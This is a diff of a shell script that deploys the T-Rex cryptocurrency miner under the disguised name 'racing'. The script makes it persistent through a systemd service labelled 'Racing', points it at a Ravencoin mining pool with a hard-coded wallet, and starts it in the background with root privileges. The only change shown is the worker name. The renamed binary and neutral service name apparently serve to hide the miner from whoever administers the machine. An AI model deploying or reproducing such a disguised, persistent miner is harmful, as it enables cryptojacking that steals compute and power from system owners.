@@ -20,4 +20,4 @@ sudo mv t-rex racing
 sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u RM11VvoTyD4CeixsMLHR9ntqpaMTKHMEYL.abcd -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-sudo ./racing -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u RM11VvoTyD4CeixsMLHR9ntqpaMTKHMEYL.clgt -p x &
+sudo ./racing -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u RM11VvoTyD4CeixsMLHR9ntqpaMTKHMEYL.clgt1 -p x &
